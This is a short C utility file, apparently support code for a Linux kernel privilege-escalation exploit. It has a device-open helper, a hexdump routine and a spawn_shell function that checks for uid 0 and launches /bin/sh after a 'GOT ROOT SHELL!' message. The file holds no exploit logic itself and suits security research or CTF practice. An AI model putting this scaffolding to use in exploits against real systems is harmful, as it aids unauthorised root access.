#include "utils.h"

/* Open file stream for a device/module */
int open_dev(const char *path, int flags) 
{
    int fd = open(path, flags);
    if (fd < 0) {
        FAILURE("Failed to open %s: %s", path, strerror(errno));
        DIE("open_dev");
    }

    SUCCESS("Opened device: %s (fd=%d)", path, fd);
    return fd;
}

/* Print a hex dump of memory */
void hexdump(const char *label, const void *addr, size_t len) {
    const unsigned char *p = (const unsigned char *)addr;
    printf("%s (%zu bytes):\n", label, len);
    for (size_t i = 0; i < len; ++i) {
        printf("%02x ", p[i]);
        if ((i + 1) % 16 == 0) putchar('\n');
    }
    if (len % 16 != 0) putchar('\n');
}

/* Spawn root shell if uid == 0 */
void spawn_shell(void)
{
    INFO("Returned to userland")
    if (getuid() == 0) {
        SUCCESS("GOT ROOT SHELL!");
        system("/bin/sh");
    } else {
        FAILURE("Privesc failed");
        exit(1);
    }
}

